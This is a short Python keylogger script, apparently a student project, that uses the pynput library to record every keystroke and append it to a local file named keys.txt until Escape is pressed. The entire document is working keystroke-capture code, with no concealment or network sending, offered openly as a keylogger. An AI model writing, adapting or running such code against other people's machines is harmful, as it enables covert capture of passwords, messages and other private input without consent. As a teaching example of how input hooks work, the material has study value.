# Keylogger Program
# Made by: Zack Barrier, Computer Science student at The University of North Carolina at Charlotte

# import keyboard subpackage from pynput
from pynput import keyboard

# import listener & key from keyboard subpackage
from pynput.keyboard import Key, Listener

def on_press(Key):
    try:
        # if enter is pressed
        if(Key == keyboard.Key.enter):
            # go to a new line
            write_file("\n") 
        elif(Key == keyboard.Key.space):
            write_file(" ")
        # if tab is pressed
        elif(Key == keyboard.Key.tab):
            # write a tab
            write_file("    ")
        # if backspace is pressed
        elif(Key == keyboard.Key.backspace):
            # Write that backspace was pressed
            write_file("\nBackspace Pressed\n")
        else:
            # if none of the special cases, write the key
            write_file(Key)

    # in attribute isn't found
    except AttributeError:
        temp = repr(Key) + " Pressed \n"
        write_file(temp)
        print("\n{} Pressed\n".format(Key))

def on_release(Key):
    if (Key == keyboard.Key.esc):
        # This stops listening for keys when the ESC key is pressed
        return False

def write_file(text):
    # use absolute path 
    with open("keys.txt",'a') as f:
        k = str(text).replace("'","")
        f.write(k)

    
# make a listener which listens to the keys
with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
    
